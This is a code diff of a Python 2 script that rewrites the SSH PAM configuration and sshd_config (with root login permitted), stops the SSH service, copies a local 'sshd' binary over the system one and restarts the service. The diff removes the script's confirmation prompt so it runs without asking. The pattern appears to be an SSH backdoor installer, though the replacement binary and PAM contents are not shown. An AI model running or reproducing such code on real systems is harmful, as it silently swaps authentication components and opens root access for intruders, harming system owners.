@@ -39,28 +39,28 @@ PermitRootLogin yes
 copy_command = "cp sshd /usr/sbin"
 
 def write():
-    value = raw_input("are you sure you want to move overwrite to those files.(y[yes]/n)")
-    if value == 'yes' or value == 'y':
-        try:
-            with open("/etc/pam.d/sshd", "w") as f:
-                f.write(write_text)
-        except Exception as e:
-            print(e)
-        try:
-            os.system("cp /etc/ssh/sshd_config /etc/ssh/sshd_config_bak")
-            with open("/etc/ssh/sshd_config", "w") as f:
-                f.write(sshd_config)
-        except Exception as e:
-            print(e)
-            raise e
-        os.system("service sshd stop")
-        try:
-            os.system(copy_command)
-        except Exception as e:
-            print(e)
-        os.system("service sshd start")
-    print("choose has made.")
+    # value = raw_input("are you sure you want to move overwrite to those files.(y[yes]/n)")
+    # if value == 'yes' or value == 'y':
+    try:
+        with open("/etc/pam.d/sshd", "w") as f:
+            f.write(write_text)
+    except Exception as e:
+        print(e)
+    try:
+        os.system("cp /etc/ssh/sshd_config /etc/ssh/sshd_config_bak")
+        with open("/etc/ssh/sshd_config", "w") as f:
+            f.write(sshd_config)
+    except Exception as e:
+        print(e)
+        raise e
+    os.system("service sshd stop")
+    try:
+        os.system(copy_command)
+    except Exception as e:
+        print(e)
+    os.system("service sshd start")
+    return "done"
 
 
 if __name__ == "__main__":
-    write()
+    print write()
